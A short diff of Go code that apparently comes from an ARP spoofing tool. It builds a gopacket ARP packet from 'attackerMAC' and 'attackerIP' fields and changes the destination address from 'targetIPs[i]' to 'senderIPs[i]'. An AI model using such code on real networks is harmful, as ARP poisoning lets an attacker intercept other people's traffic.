@@ -95,7 +95,7 @@ func main() {
 				SourceHwAddress:   attackerMAC,
 				SourceProtAddress: attackerIP,
 				DstHwAddress:      net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-				DstProtAddress:    targetIPs[i],
+				DstProtAddress:    senderIPs[i],
 			}
 			buf1 := gopacket.NewSerializeBuffer()
 			opts1 := gopacket.SerializeOptions{}
